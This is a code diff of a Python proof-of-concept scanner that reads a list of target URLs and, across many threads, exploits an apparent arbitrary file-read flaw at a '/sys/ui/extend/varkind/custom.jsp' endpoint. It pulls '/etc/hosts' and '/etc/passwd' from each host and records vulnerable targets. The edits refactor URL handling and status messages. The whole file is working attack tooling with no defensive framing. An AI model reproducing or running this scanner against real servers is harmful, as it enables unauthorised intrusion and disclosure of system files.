@@ -70,32 +70,31 @@ class POC:
 
     # 验证漏洞
     def verify(self, url):
-        try:
-            url = url.replace("http://", "")
-        except:
-            try:
-                url = url.replace("https://", "")
-            except:
-                pass
-        if "127.0.0.1" in self.readFile(url, "/etc/hosts"):
-            msg = f"\033[32m[+] {url} Exist Vulnerability !\033[0m"
+        repData = self.readFile(url, "/etc/hosts")
+        if "127.0.0.1" in repData:
+            msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
             self.lock.acquire()
             try:
                 self.findCount += 1
                 self.vulnRULList.append(url)
             finally:
                 self.lock.release()
+        elif "Conn" == repData:
+            msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
         else:
-            if "root" in self.readFile(url, "/etc/passwd"):
-                msg = f"\033[32m[+] {url} Exist Vulnerability !\033[0m"
+            repData = self.readFile(url, "/etc/passwd")
+            if "root" in repData:
+                msg = f"\033[32m[+] [ Vuln ]  {url}\033[0m"
                 self.lock.acquire()
                 try:
                     self.findCount += 1
                     self.vulnRULList.append(url)
                 finally:
                     self.lock.release()
+            elif "Conn" == repData:
+                msg = f"\033[31m[!] [ Conn ]  {url}\033[0m"
             else:
-                msg = f"[-] {url} is safe"
+                msg = f"[-] [ Safe ]  {url}"
         self.lock.acquire()
         try:
             print(msg)
@@ -104,7 +103,7 @@ class POC:
 
     # 利用漏洞读取文件
     def readFile(self, url, filename):
-        reqURL = "http://" + url + "/sys/ui/extend/varkind/custom.jsp"
+        reqURL = url + "/sys/ui/extend/varkind/custom.jsp"
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
             "Content-Type": "application/x-www-form-urlencoded"
@@ -117,12 +116,14 @@ class POC:
         except:
             return ""
 
-    # 加载url地址
+    # 加载url地址(带http://)
     def loadURL(self):
         urlList = []
         with open(self.args.file) as f:
             for line in f.readlines():
-                urlList.append(line.strip())
+                line = line.replace("http://", "") if "http://" in line else line
+                line = line.replace("https://", "") if "https://" in line else line
+                urlList.append(f"http://{line.strip()}")
         return urlList
 
     # 多线程运行
